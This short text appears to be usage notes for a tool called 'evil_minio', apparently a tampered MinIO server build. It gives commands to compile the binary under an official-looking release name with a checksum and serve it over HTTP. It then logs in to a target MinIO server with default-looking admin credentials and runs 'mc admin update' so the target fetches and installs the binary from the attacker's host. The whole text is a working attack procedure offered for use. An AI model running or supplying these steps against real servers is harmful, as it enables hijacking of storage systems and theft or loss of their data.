evil_minio-main.zip<br>
https://github.com/AbelChe/evil_minio<br>
use:<br>
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -trimpath && mv minio minio.RELEASE.2023-03-22T06-36-24Z && shasum -a 256 minio.RELEASE.2023-03-22T06-36-24Z > minio.RELEASE.2023-03-22T06-36-24Z.sha256sum<br>
python3 -m http.server<br>
./mc alias set myminio http://x.x.x.x:9000 minioadmin miniopassword<br>
./mc admin update myminio http://x.x.x.x:8000/minio.RELEASE.2023-03-22T06-36-24Z.sha256sum -y